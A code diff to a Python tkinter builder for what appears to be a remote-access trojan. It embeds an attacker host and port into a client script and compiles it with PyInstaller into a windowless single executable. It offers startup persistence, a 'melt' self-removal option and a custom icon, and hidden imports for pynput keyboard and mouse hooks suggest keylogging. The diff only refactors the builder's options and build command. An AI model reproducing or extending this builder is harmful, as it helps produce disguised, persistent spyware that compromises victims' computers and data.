@@ -47,17 +47,17 @@ def get_pyinstaller():
         _path = f"{path}\\Scripts\\pyinstaller.exe"
         if os.path.isfile(_path):
             return "\"" + _path + "\""
-            
+
     tkinter.messagebox.showerror("Error", "Pyinstaller not found in any site packages.")
     sys.exit(0)
 
 
 def save_files(client_args):
-    client_new_line = f"if __name__ == \"__main__\": \n{4 * ' '}Client({', '.join(client_args)}).start()\n"
+    client_new_line = f"if __name__ == \"__main__\": \n{4 * ' '}MainClient({', '.join(client_args)}).start()\n"
 
     main_match = "if __name__ == \"__main__\":"
 
-    file = open("client.py", "r")
+    file = open("main_client.py", "r")
     file_contents = file.readlines()
     file.close()
 
@@ -69,7 +69,7 @@ def save_files(client_args):
     file_contents = file_contents[:i]
     file_contents.append(client_new_line)
 
-    file = open("client.py", "w")
+    file = open("main_client.py", "w")
     file.writelines(file_contents)
     file.close()
 
@@ -97,7 +97,7 @@ class Setup:
         self.melt = IntVar()
         self.add_startup = IntVar()
         self.is_console = IntVar()
-        self.one_file = IntVar()
+        self.is_debug = IntVar()
         self.icon = IntVar()
         self.icon_path = None
         self.is_hostname = False
@@ -141,20 +141,21 @@ class Setup:
         self.misc_frame = LabelFrame(self.frame, text="Misc.")
         self.misc_frame.pack(side=LEFT)
 
-        self.onefile_cb = Checkbutton(self.misc_frame, text="One file", variable=self.one_file)
-        self.onefile_cb.grid(column=0, row=0, sticky=W)
+        self.startup_cb = Checkbutton(self.misc_frame, text="Add to startup", variable=self.add_startup)
+        self.startup_cb.grid(column=0, row=0, sticky=W)
 
-        self.startup_cb = Checkbutton(self.misc_frame, text="Add to startup", variable=self.add_startup, command=self.startup_cb_callback)
-        self.startup_cb.grid(column=0, row=1, sticky=W)
+        self.add_icon_cb = Checkbutton(self.misc_frame, text="Custom icon", variable=self.icon,
+                                       command=self.add_icon_cb_callback)
+        self.add_icon_cb.grid(column=0, row=1, sticky=W)
 
-        self.add_icon_cb = Checkbutton(self.misc_frame, text="Custom icon", variable=self.icon, command=self.add_icon_cb_callback)
-        self.add_icon_cb.grid(column=0, row=2, sticky=W)
-
-        self.melt_cb = Checkbutton(self.misc_frame, text="Melt file", variable=self.melt, command=self.melt_cb_callback)
-        self.melt_cb.grid(column=0, row=3, sticky=W)
+        self.melt_cb = Checkbutton(self.misc_frame, text="Melt file", variable=self.melt)
+        self.melt_cb.grid(column=0, row=2, sticky=W)
 
         self.console_cb = Checkbutton(self.misc_frame, text="Console app", variable=self.is_console)
         self.console_cb.grid(column=0, row=4, sticky=W)
+
+        self.debug_cb = Checkbutton(self.misc_frame, text="Pyinstaller debug", variable=self.is_debug, command=self.debug_cb_callback)
+        self.debug_cb.grid(column=0, row=5, sticky=W)
 
         self.build_btn = Button(self.frame, text="Build", width=36, command=self.build_btn_callback)
         self.build_btn.pack(padx=8, side=BOTTOM, anchor=W)
@@ -186,6 +187,13 @@ class Setup:
         self.log_sbtxt.insert(INSERT, log)
         self.log_sbtxt.configure(state="disabled")
 
+    def debug_cb_callback(self):
+        if bool(self.is_debug.get()):
+            self.is_console.set(1)
+            self.console_cb.config(state=DISABLED)
+        else:
+            self.console_cb.config(state=ACTIVE)
+
     def build_btn_callback(self):
         port = self.port_et.get()
 
@@ -202,27 +210,28 @@ class Setup:
             self.disable_build_ui()
 
             client_args = \
-                [f"'{self.host}'", str(port), str(self.is_hostname), str(bool(self.add_startup.get())), str(bool(self.melt.get()))]
+                [f"'{self.host}'", str(port), str(self.is_hostname), str(bool(self.add_startup.get())),
+                 str(bool(self.melt.get()))]
 
             save_files(client_args)
 
             icon_command = ""
-            windowed = "--windowed "
-            onefile = ""
+            windowed = "--windowed"
+            debug_command = ""
 
             if bool(self.is_console.get()):
                 windowed = ""
 
             if self.icon_path:
-                icon_command = f"--icon {self.icon_path} "
+                icon_command = f"--icon {self.icon_path}"
 
-            if bool(self.one_file.get()):
-                onefile = "--onefile"
+            if bool(self.is_debug.get()):
+                debug_command = "--debug=all --log-level DEBUG"
 
-            command_arg = f"{self.pyinstaller} client.py {windowed}{icon_command}{onefile} --noupx -y --hidden-import " \
-                          f"pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module " \
-                          f"FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter --exclude-module " \
-                          f"tkinter --exclude-module Tkinter --debug=all --log-level DEBUG --clean --onedir"
+            command_arg = f"{self.pyinstaller} main_client.py {windowed} {icon_command} {debug_command} --onefile -y " \
+                          f"--clean --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 " \
+                          f"--exclude-module FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter " \
+                          f"--exclude-module tkinter --exclude-module Tkinter "
 
             def run_command():
                 self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
@@ -232,22 +241,6 @@ class Setup:
                 self.create_log_ui(log)
 
             threading.Thread(target=run_command, daemon=False).start()
-
-    def melt_cb_callback(self):
-        if self.melt.get() == 1:
-            self.one_file.set(1)
-            self.onefile_cb.config(state=DISABLED)
-        else:
-            if self.add_startup.get() != 1:
-                self.onefile_cb.config(state=ACTIVE)
-
-    def startup_cb_callback(self):
-        if self.add_startup.get() == 1:
-            self.one_file.set(1)
-            self.onefile_cb.config(state=DISABLED)
-        else:
-            if self.melt.get() != 1:
-                self.onefile_cb.config(state=ACTIVE)
 
     def add_icon_cb_callback(self):
         if self.icon.get() == 1:
